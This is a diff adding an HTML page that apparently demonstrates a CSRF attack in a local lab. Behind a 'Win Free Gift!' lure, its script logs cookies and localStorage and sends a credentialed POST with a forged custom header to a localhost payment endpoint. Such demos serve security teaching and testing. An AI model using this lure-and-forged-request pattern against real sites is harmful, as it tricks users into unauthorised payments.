@@ -1,0 +1,28 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>CSRF Custom Header</title>
+  </head>
+
+  <body>
+    <h2>🎁Win Free Gift!</h2>
+    <!-- <form action="http://localhost:4000/pay" method="post">
+      <input name="csrfToken" value="12345" hidden />
+      <button>Get free gift.</button>
+    </form> -->
+    <script type="module">
+        console.log(localStorage)
+        console.log(document.cookie)
+       const res = await fetch('http://localhost:4000/pay', {
+        method: 'POST',
+        credentials: 'include',
+        headers: {
+          'x-csrf-token': 'csrf-header',
+        },
+      });
+      console.log(await res.text())
+    </script>
+  </body>
+</html>
